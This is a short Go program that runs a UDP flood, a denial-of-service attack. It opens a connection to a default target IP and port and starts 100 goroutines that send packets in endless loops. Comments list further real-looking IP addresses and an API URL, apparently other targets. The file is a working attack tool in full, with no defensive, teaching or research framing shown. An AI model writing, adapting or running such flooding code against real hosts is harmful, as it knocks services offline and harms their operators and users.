package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"net/http"
)

var (
	_host    = flag.String("h", "217.30.171.176", "Specify Host")
	_port    = flag.Int("p", 3443, "Specify Port")
	_threads = flag.Int("t", 100, "Specify threads")
	_size    = flag.Int("s", 507, "Packet Size")
)

// 213.230.99.94

// 65507

//https://87.237.235.68:8089/driver_candidate_api/v1/settings
func main() {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	flag.Parse()

	fullAddr := fmt.Sprintf("%s:%v", *_host, *_port)
	//Create send buffer
	buf := make([]byte, *_size)

	//Establish udp
	conn, err := net.Dial("udp", fullAddr)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Printf("Flooding %s\n", fullAddr)
		for i := 0; i < *_threads; i++ {
			go func() {
				for {
					conn.Write(buf)
				}
			}()
		}
	}

	//Sleep forever
	<-make(chan bool, 1)
}
